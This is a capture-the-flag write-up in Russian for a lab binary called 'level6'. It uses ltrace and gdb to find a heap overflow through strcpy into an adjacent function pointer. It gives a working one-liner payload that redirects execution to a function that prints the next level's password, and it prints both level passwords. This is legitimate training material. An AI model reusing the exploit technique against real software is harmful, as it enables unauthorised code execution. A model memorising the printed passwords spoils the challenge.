# su level6
# pass: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

====
Уязвимость: отключена рандомизация памяти, последовательное выделение памяти (маллок), перезатереть указатель через переполнение strcpy
====

**Поведение: без аргументов сегается, с одним вывод Nope**

# ./level6 
Segmentation fault (core dumped)

# ltrace ./level6 
   __libc_start_main(0x804847c, 1, 0xbffff804, 0x80484e0, 0x8048550 <unfinished ...>
   malloc(64)                                                                     = 0x0804a008
   malloc(4)                                                                      = 0x0804a050
   strcpy(0x0804a008, NULL <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++

# ./level6 123
Nope

# ltrace ./level6 123
   __libc_start_main(0x804847c, 2, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
   malloc(64)                                                                     = 0x0804a008
   malloc(4)                                                                      = 0x0804a050
   strcpy(0x0804a008, "123")                                                      = 0x0804a008
   puts("Nope"Nope
   )                                                                   = 5
   +++ exited (status 5) +++

Проверяем gdb - функции

# i func
<>
0x08048454  n
0x08048468  m
0x0804847c  main
<>

# disas main

Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp                       32
   0x08048485 <+9>:     movl   $0x40,(%esp)                     64
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)                  28
   0x08048495 <+25>:    movl   $0x4,(%esp)                      4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx                  0x8048468 <m>:  0x83e58955
   0x080484aa <+46>:    mov    0x18(%esp),%eax                  24
   0x080484ae <+50>:    mov    %edx,(%eax)                      m
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax                   12
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax                  28
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax                  24
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave  
   0x080484d3 <+87>:    ret    
End of assembler dump.

В мейне маллочится 2 строки, вызывается функция m, которая выводит Nope, а вот n вызывает катом флаг, однако нигде не вызывается.

# disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp                       24
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)                "Nope"
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave  
   0x0804847b <+19>:    ret    
End of assembler dump.

# disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)            "/bin/cat /home/user/level7/.pass"
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave  
   0x08048467 <+19>:    ret    
End of assembler dump.

Два маллока вызываются последовательно, рандомизация памяти отключена -> выделение памяти тоже будет последовательно. Можно переполнить строку (1 маллок на 64), дойти до указателя (второй маллок на 4) и переписать указатель на другую функцию.
Необходимо вызвать n функцию, для этого можно воспользоваться уязвимостью strcpy, т.к. ввод не ограничен, переписываем адрес.
Для вычисления, сколько нужно - в ltrace 0x0804a050 - 0x0804a008 = 72
+ 4 адрес функции

# ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d